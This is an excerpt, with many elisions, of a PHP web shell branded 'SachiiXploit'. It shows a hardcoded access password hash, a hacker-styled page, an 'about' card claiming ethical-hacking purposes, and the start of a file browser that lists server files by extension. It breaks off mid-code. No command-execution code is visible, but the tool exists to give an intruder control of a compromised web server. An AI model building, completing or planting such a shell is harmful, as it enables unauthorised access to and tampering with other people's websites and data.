...
$auth_pass          = "be004b82f818caa1e2df3cb31f286d98";
$color              = "#00ff00";
...
<html>
    <head>
        ...
        <meta name="author" content="SachiiHaxor"/>
        <meta name="copyright" content=" BHI OFFICIAL "/>
  <style>
        body{
            background-image: url(https://studiostar7.net/wp-content/uploads/2017/07/BG-PJMBLACK.jpg);
...
<img src="https://i.ibb.co/Y7WKbRX/anonymous.png">
            <br><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;"></h1>
            <hr/>
        ...
        if (isset($_GET['about'])) {
            echo '<div class="card text-center bg-light about">
                <h4 class="card-header"><i class="fa fa-arrow-right text-primary"></i> SachiiXploit </h4>
                <div class="card-body">
                    <center><img src="https://iconape.com/wp-content/png_logo_vector/anonymous-logo.png" width="200"></div></center>
                    <p class="card-text"><i class="fa fa-warning text-danger"></i> Exploiting Ethical Hacking Learn. <i class="fa fa-warning text-danger"></i> </p>
                </div>
                <div class="card-footer">
                    <p class="card-text"><small class="text-muted">Copyright 2022 - SachiiXploit</small></p>
                </div>
            </div><br/>';
            exit;
        }
        ...
        echo '<center><div id="tab"><table class="text-white mt-1 table-hover table-responsive">
            ...
            foreach($scandir as $file){
                ...
                echo '<tr>
                    ...
                    if($ext == "php") {
                        echo 'https://www.freepnglogos.com/uploads/php-logo-png/php-logo-php-elephant-logo-vectors-download-5.png"';
                    }elseif ($ext == "html") {
                        echo 'https://findicons.com/files/icons/2813/flat_jewels/512/file.png"';
                    }elseif ($ext == "css") {
                        echo 'https://icon-library.com/images/css-icon/css-icon-12.jpg"';
                    }elseif ($ext == "png") {
                        ...
                        echo 'https://iconarchive.com/download/i60207/zerode/plump/Folder-Archive-zip.ico"';
                    }elseif ($ext == "js") {
                        ...
                        echo 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/i/a4394659-8f72-497c-8f9a-f284134fa7ac/d6mylpe-f85cba3a-a23c-43d2-886c-4fdd6cb90c73.png';
                    }elseif ($ext == "conf") {
